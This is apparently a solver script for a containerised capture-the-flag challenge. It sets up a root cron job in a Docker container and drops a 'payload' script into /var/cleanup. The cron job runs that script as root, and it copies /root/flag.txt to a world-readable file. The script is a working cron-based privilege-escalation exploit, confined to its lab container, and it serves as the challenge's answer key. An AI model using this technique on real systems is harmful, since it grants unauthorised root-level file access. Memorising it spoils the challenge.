#!/usr/bin/env bash
set -euo pipefail

IMAGE="challenge9:latest"
CONTAINER="challenge9"

have_image() { docker image inspect "$IMAGE" >/dev/null 2>&1; }
have_container() { docker ps -a --format '{{.Names}}' | grep -q "^${CONTAINER}$"; }
is_running() { [ "$(docker inspect -f '{{.State.Status}}' "$CONTAINER")" = "running" ]; }

# 0) Build image if missing (expects ./app/Dockerfile from build.sh)
if ! have_image; then
  if [ -f "./app/Dockerfile" ]; then
    echo "[i] Image not found. Building $IMAGE from ./app ..."
    docker build -t "$IMAGE" ./app
  else
    echo "[!] Image $IMAGE not found and ./app/Dockerfile missing. Aborting."
    exit 1
  fi
fi

# 1) Ensure container exists and is running
if ! have_container; then
  echo "[i] Container does not exist. Creating a fresh one (detached)..."
  # Keep container alive even without an interactive TTY
  docker run -d --name "$CONTAINER" "$IMAGE" \
    /bin/bash -lc "/usr/sbin/crond -l 2; tail -f /dev/null"
elif ! is_running; then
  echo "[i] Container exists but is not running. Starting it..."
  docker start "$CONTAINER" >/dev/null
fi

# 2) Ensure crond is running and crontab is present (Alpine style)
echo "[i] Verifying crond and crontab inside container..."
docker exec "$CONTAINER" /bin/sh -lc '
  # Start crond if not running
  pgrep crond >/dev/null 2>&1 || /usr/sbin/crond -l 2

  # Make sure root crontab exists and has the job
  if ! grep -q "/usr/local/bin/cleanup.sh" /etc/crontabs/root 2>/dev/null; then
    echo "* * * * * /bin/bash /usr/local/bin/cleanup.sh >> /var/log/cleanup.log 2>&1" >> /etc/crontabs/root
  fi
  chmod 600 /etc/crontabs/root 2>/dev/null || true

  # Ask crond to reload jobs (HUP) or just restart it quietly
  if pgrep crond >/dev/null 2>&1; then
    kill -HUP "$(pgrep crond | head -n1)" 2>/dev/null || /usr/sbin/crond -l 2
  else
    /usr/sbin/crond -l 2
  fi
'

# 3) Drop the payload
read -r -d '' PAYLOAD <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
cat /root/flag.txt > /tmp/flag.out
chmod 644 /tmp/flag.out
EOF

tmpfile="$(mktemp)"
echo "$PAYLOAD" > "$tmpfile"
chmod +x "$tmpfile"
docker cp "$tmpfile" "$CONTAINER":/var/cleanup/grabflag.sh
rm -f "$tmpfile"

# 4) Wait for cron to execute (up to 120s)
echo "[i] Waiting for cron to run payload..."
success=0
for _ in $(seq 1 24); do
  if docker exec "$CONTAINER" test -f /tmp/flag.out; then
    success=1
    break
  fi
  sleep 5
done

# 5) Output result or helpful debug
if [ "$success" -eq 1 ]; then
  docker exec "$CONTAINER" cat /tmp/flag.out
else
  echo "[!] Timed out waiting for cron."
  echo "---- /etc/crontabs/root ----"
  docker exec "$CONTAINER" sh -lc 'cat /etc/crontabs/root || true'
  echo "---- ps aux | grep crond ----"
  docker exec "$CONTAINER" sh -lc 'ps aux | grep crond | grep -v grep || true'
  echo "---- tail /var/log/cleanup.log ----"
  docker exec "$CONTAINER" sh -lc 'tail -n 50 /var/log/cleanup.log || true'
  exit 2
fi
